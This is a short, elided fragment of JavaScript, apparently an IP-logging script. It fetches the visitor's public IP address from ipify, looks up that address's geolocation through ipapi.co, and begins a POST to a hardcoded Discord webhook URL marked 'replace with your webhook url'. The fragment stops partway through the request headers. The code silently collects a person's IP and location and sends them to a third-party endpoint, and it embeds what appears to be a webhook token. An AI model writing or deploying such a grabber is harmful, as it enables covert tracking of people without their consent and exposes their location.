    ...
    fetch('https://api.ipify.org?format=json')
        ...
        .then(ipData => {
            ...
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                ...
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/2382848350545772578/PU2Lzsq-6Ixvt8M6pAPDTRdiU1ddVd_Zt_E6ysUsotPMDQOhfee_kj-F5pPW'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
